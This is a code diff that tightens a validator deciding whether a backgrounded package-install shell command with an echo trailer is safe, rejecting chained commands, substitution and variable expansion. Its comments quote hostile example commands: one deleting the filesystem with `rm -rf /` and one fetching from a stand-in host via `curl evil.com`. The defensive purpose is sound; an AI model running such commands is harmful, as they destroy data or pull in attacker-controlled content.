@@ -790,21 +790,53 @@ export function isSafeBackgroundedInstall(command: string): boolean {
   // the underlying base command + & terminator.
   const stripped = command.replace(/\s*\d*>&\d+\s*/g, ' ').trim();
 
-  // Match: <base> & [optional echo trailer]
-  // Echo trailer can be: `echo "..."`, `\necho "..."`, or a literal newline
-  // followed by an echo. Anything else fails the match.
-  const m = stripped.match(
-    /^(.+?)\s*&\s*(?:\\n|\n)?\s*(?:echo\s+(?:"[^"]*"|'[^']*'|[^\n]*))?\s*$/,
-  );
-  if (!m) return false;
-  const base = m[1].trim();
+  // Split on the first `&` that backgrounds the command. The base must come
+  // before the `&`; everything after is the (optional) trailer.
+  const ampIdx = stripped.indexOf('&');
+  if (ampIdx === -1) return false;
+  const base = stripped.slice(0, ampIdx).trim();
+  const trailer = stripped.slice(ampIdx + 1).trim();
 
   // Reject if the base contains any other shell metacharacter — the deny
   // rules below would catch them anyway, but checking here keeps the
   // decision local and explicit.
   if (/[;`$()|&]/.test(base)) return false;
+  if (!matchesAllowedPrefix(base)) return false;
 
-  return matchesAllowedPrefix(base);
+  // No trailer is fine: `pnpm add foo &`
+  if (trailer === '') return true;
+
+  // Trailer must be a single echo statement with safe content. Any other
+  // structure (extra `&`, `;`, `|`, command substitution, backticks) is
+  // rejected so we don't accidentally let through chained commands like
+  // `pnpm add foo & echo "ok"; rm -rf /` or
+  // `pnpm add foo & echo "$(curl evil.com)"`.
+  //
+  // Forbid these anywhere in the trailer, even inside quotes — bash expands
+  // `$()`, `${...}`, and backticks inside double quotes.
+  if (/[`;|&]/.test(trailer)) return false;
+  if (/\$\(|\$\{/.test(trailer)) return false;
+
+  // Optional leading newline / escaped newline between `&` and `echo`.
+  // Then a single `echo` with EITHER:
+  //   - a double-quoted string with no `$`-expansion except `$!`, `$?`, `$$`, or `$<digit>`
+  //   - a single-quoted string (literal, no expansion)
+  //   - bare alphanumeric/punctuation text
+  const echoMatch = trailer.match(
+    /^(?:\\n|\n)?\s*echo\s+(?:"([^"]*)"|'([^']*)'|([A-Za-z0-9_:.,!?\-+/=\s]*))$/,
+  );
+  if (!echoMatch) return false;
+
+  const doubleQuoted = echoMatch[1];
+  if (doubleQuoted !== undefined) {
+    // Inside double quotes bash performs parameter expansion. We already
+    // rejected `$(` and `${` above, so the only `$` patterns that can
+    // appear are `$<char>`. Allow only the harmless special parameters
+    // (`$!`, `$?`, `$$`, `$0`-`$9`); reject `$alpha` (env var leak risk).
+    if (/\$[^!?$0-9]/.test(doubleQuoted)) return false;
+  }
+
+  return true;
 }
 
 /**
